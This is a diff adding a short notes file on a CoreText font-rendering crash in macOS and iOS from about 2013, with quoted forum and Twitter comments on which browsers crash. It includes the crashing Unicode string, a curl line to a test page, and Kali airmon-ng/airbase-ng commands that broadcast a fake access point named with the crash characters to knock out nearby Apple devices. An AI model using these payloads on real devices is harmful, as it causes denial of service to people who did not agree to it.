@@ -1,0 +1,17 @@
+# webkit
+
+# CoreText Mac OSX DoS
+https://news.ycombinator.com/item?id=6293824
+
+This isn't a bug inside WebKit. It's a bug inside Apples CoreText font rendering framework.
+`curl https://zhovner.com/tmp/killwebkit.html` in iTerm2 crashes
+
+Yes, I cannot reproduce the crash on OS X 10.8.4 and iTerm2 1.0.0.20130624. Maybe Apple has fixed it in the latest OS patch.
+UPDATE: It does kill Chrome 31 (individual tab) and Safari 6.0.5 (the whole browser!).
+
+https://twitter.com/daken_/status/303784082599456768 "Safari crashes on 10.8.4 for me."
+
+python -c "u'\u0647\u0020\u0488\u0488\u0488'
+
+root@kali:~# airmon-ng start wlan0
+root@kali:~# airbase-ng -e " ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ" -q -c 11 mon0
